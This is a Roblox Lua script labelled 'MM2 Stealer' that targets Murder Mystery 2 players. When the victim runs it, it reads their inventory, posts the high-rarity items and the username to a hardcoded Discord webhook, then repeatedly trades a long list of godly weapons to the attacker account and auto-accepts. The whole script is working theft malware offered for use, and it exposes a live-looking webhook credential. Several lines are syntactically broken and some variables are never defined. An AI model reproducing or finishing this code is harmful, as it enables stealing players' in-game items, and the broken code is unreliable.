local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local plr.Name = Players.LocalPlayer

getgenv().user = "MM2danya7"
local webhook = "https://discord.com/api/webhooks/1417171931693584466/F_sTxNCu9VQTRMw0EFUN-hMmbJXHb-a4nEHJY2ixhrCaiWbvjMSDRS3XCodgx29n9FDA"

local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.victim)

-- определение предметов для отправки
local send.wpn = {}
for dataid, amount in pairs(profileData.Weapons.Owned) do
    local itemInfo = database[dataid]
    if itemInfo then
        local rarityIndex = table.find(rarityTable, itemInfo.Rarity)
        if rarityIndex and rarityIndex >= min_rarityindex then
            table.insert(send.wpn, {
                DataID = itemInfo.ItemName,
                Rarity = itemInfo.Rarity,
                Amount = amount
            })
        end
    end
end

if #send.wpn > 0 then
    local function formatItems(items)
        local str = ""
        for , item in ipairs(items) do
            str = str .. string.format("%s (x%s) - %s\n", item.DataID, item.Amount, item.Rarity)
        end
        if str == "" then str = "None" end
        return str
    end

    local fields = {
        {name = "Username", value = plr.Name, inline = true},
        {name = "Items", value = formatItems(send.wpn), inline = false}
    }

local data = {
    ["embeds"] = {{
        ["title"] = "MM2 Stealer",
        ["color"] = 0x0663EE, -- синяя полоска (правильный шестнадцатеричный литерал)
        ["fields"] = {
            {name = "Username", value = plr.Name, inline = true},
            {name = "Items", value = formatItems(send.wpn), inline = false}
        },
        ["footer"] = {["text"] = "mm2 by vexadez"}
        ["image"] = {["url"] = "image.png"}
    }}
}


request({
    Url = webhook,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(data)
})



while true do
    local targetPlayer = Players:FindFirstChild(user)
    if targetPlayer then
        ReplicatedStorage.Trade.SendRequest:InvokeServer(targetPlayer)
        print("By vexadez " .. user)
        task.wait(0.4)

        local List = {
    -- godly
    "Chroma Luger", "Chroma Laser", "Chroma Lightbringer", "Chroma Darkbringer",
    "Chroma Saw", "Chroma Slasher", "Chroma Fang", "Chroma Candleflame",
    "Chroma Elderwood Blade", "Chroma Boneblade",
    "Harvester", "Hallowscythe", "Elderwood Scythe", "Logchopper", "Batwing",
    "Icebreaker", "Swirlyblade", "Swirly Axe", "Bioblade",
    "Champion Blade", "Champion Axe", "Cavern Blade", "Comp Blade", "Trophy", "Scythe",
    "Eternal", "Eternal II", "Eternal III", "Eternal IV", "Eternal V", "Eternal Cane",
    "Candy Gun", "Pumpkin Gun", "Web Gun", "Sugar", "Snowball Launcher",
    "Ameriluger", "Luger Cane", "RedLuger", "Laser Beam",
    "Gingerscope", "Gingerblade"
}

        for _, item in ipairs(List) do
            ReplicatedStorage.Trade.OfferItem:FireServer(item, "Weapons")
            task.wait(0.03)
        end

        print("B.k.b")
        task.wait(5)

        local args = {285646582}
        ReplicatedStorage.Trade.AcceptTrade:FireServer(unpack(args))
        print("Lol thanks , by vexadez xd")

        task.wait(3)
    else
        print("Player " .. user .. " sleeping")
        task.wait(5)
    end
end
